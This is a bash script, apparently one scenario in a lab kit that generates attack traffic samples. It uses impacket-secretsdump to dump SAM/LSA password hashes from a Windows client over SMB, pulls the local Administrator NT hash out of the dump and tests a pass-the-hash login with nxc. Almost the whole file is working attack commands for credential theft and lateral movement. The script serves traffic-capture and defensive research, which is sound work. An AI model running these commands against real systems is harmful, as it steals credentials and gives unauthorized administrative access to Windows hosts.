#!/usr/bin/env bash
# S07 — Remote SAM/LSA dump + pass-the-hash. Kategori: Backdoor/Exploits.
# secretsdump (impacket) dump hash dari win-client, lalu PTH via nxc smb.
# Target: win-client :445. Fase: WINDOWS.
SCN=S07; ATTACK_CAT=Backdoor; PHASE=windows
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool impacket-secretsdump; need_tool nxc
banner
ensure_up "$WIN"

mark_start "$WIN"
echo "== 1) secretsdump (SAM/LSA) via admin_lab =="
impacket-secretsdump "${WIN_USER}:${WIN_PASS}@${WIN}" | tee "$HERE/s07-secretsdump.txt" || true
settle 4

echo "== 2) pass-the-hash: ambil NT hash Administrator lokal dari dump, uji ke SMB =="
# format baris secretsdump: User:RID:LMhash:NThash:::
NTHASH="$(grep -i '^Administrator:' "$HERE/s07-secretsdump.txt" | head -n1 | cut -d: -f4)"
if [ -n "${NTHASH:-}" ] && [ "$NTHASH" != "31d6cfe0d16ae931b73c59d7e0c089c0" ]; then
  echo "NT hash Administrator ditemukan, uji PTH..."
  nxc smb "$WIN" -u Administrator -H "$NTHASH" | tee "$HERE/s07-pth.nxc" || true
else
  echo "Hash Administrator kosong/blank (akun mungkin disabled). PTH pakai admin_lab via -H dilewati."
  echo "(trafik dump SMB di langkah 1 sudah cukup sebagai sampel S07.)"
fi
mark_end "$WIN"
echo "Output: s07-secretsdump.txt (+ s07-pth.nxc jika ada hash)"
# CAVEAT: jangan commit s07-secretsdump.txt ke git (berisi hash) — sudah di .gitignore paket ini.
